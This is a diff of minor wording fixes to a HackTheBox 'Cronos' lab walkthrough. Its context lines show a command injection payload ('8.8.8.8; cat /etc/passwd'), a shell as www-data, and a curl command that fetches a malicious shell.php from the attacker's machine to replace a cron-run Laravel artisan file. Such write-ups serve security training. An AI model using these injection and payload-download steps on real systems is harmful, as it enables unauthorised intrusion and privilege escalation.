@@ -1,12 +1,12 @@
 # Cronos
 
-Cronos is a medium difficulty lab on the HackTheBox platform released on 22nd March, 2017 and retired on May 26th, 2017.  It can be found at [Cronos](https://app.hackthebox.com/machines/Cronos).  The goal of the lab is to retrieve the user.txt and proof.txt flags located in a user's home directory and the root home directory respectively.  
+Cronos is a medium difficulty lab on the HackTheBox platform released on 22nd March, 2017 and retired on May 26th, 2017.  It can be found at [Cronos](https://app.hackthebox.com/machines/Cronos).  The goal of the lab is to retrieve the user.txt and root.txt flags located in a user's home directory and the root home directory respectively.  
 
 For the purposes of this report, the lab's IP address is 10.129.227.211 and our IP address is 10.10.15.125.  
 
 ## Enumeration
 
-With the lab started, we can run NMAP against the target machine  
+With the lab started, we can run NMAP against the target machine.
 
 > nmap -A -p- -v --max-scan-delay 5ms -oN cronos.nmap 10.129.227.211
 
@@ -49,7 +49,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done at Thu May 28 09:31:53 2026 -- 1 IP address (1 host up) scanned in 72.50 seconds`
 ```
 
-The NMAP scan reveals 3 ports open and the potential services available on each port -- An SSH server on port 22, a DNS server on port 53, and a web server on port 80.  Testing the webserver first shows the Apache2 default page.  
+The NMAP port scan reveals 3 ports open and the potential services available on each port -- An SSH server on port 22, a DNS server on port 53, and a web server on port 80.  Testing the webserver first shows the Apache2 default page.  
 
 ![Apache2](images/Apache2.png)
 
@@ -144,7 +144,7 @@ Testing if we can break out of the net tool's logic using a semicolon (tracerout
 
 ![Whoami](images/Whoami.png)
 
-Opening the request up in BurpSuite shows the two parameters (command and host) that we are sending.  Below is an example where we are sending '8.8.8.8; cat /etc/passwd'
+Opening the request up in BurpSuite shows the two parameters (command and host) that we are sending.  Below is an example where we are sending '8.8.8.8; cat /etc/passwd'.
 
 ![Request](images/Request.png)
 
@@ -175,7 +175,7 @@ bash: no job control in this shell
 www-data@cronos:/var/www/admin$ 
 ```
 
-The user.txt flag can be retrieved from the home directory of the user 'noulis' with the following command
+The user.txt flag can be retrieved from the home directory of the user 'noulis' with the following command:
 
 > cat /home/noulis/user.txt
 
@@ -221,11 +221,11 @@ And start a python webserver on our attacking machine
 
 ``Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...``
 
-On the victim machine while in the /var/www/laravel directory, we rename the current artisan file to 'oldartisan'
+On the victim machine while in the /var/www/laravel directory, we rename the current artisan file to 'oldartisan'.
 
 > mv artisan oldartisan
 
-Then we download the malicious php file to the /var/www/laravel
+Then we download the malicious php file to the /var/www/laravel directory.
 
 > curl http\://10.10.15.125/shell.php -o artisan
 
